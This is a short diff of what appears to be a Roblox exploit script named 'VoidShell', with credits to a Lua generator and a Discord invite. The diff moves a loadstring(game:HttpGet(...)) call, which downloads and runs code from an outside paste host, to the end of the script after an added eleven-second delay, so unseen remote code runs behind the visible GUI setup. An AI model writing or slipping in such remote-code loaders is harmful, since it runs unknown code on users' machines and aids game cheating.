@@ -1,7 +1,9 @@
+
 if not VoidShell then
 getgenv().VoidShell = true
-loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/07OpuaCXpjvq2iDP/raw'))()
+task.delay(11, function()
 getgenv().VoidShell = nil
+
 -- Generated using Instance to Lua v1.3
 -- Made by nullspecter.
 -- https://discord.gg/U2nvFRa8zQ
@@ -86,4 +88,6 @@ Void_2z.Color = Color3.new(0.7803922, 0.6666667, 0.4196078)
 
 end; 
 
+end)
+loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/07OpuaCXpjvq2iDP/raw'))()
 end
